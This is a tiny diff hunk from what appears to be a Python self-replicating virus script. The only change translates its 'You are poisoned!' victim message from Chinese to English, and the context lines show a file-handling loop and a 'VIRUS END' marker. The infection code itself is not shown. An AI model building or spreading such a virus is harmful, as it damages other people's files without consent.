@@ -47,6 +47,6 @@ for prog in progs:
        fh.close()
 
 
-x=input('你中毒了!\n請按任意鍵繼續')
+x=input('You are poisoned! \nPlease press any key to continue')
 
 ##### VIRUS END #####
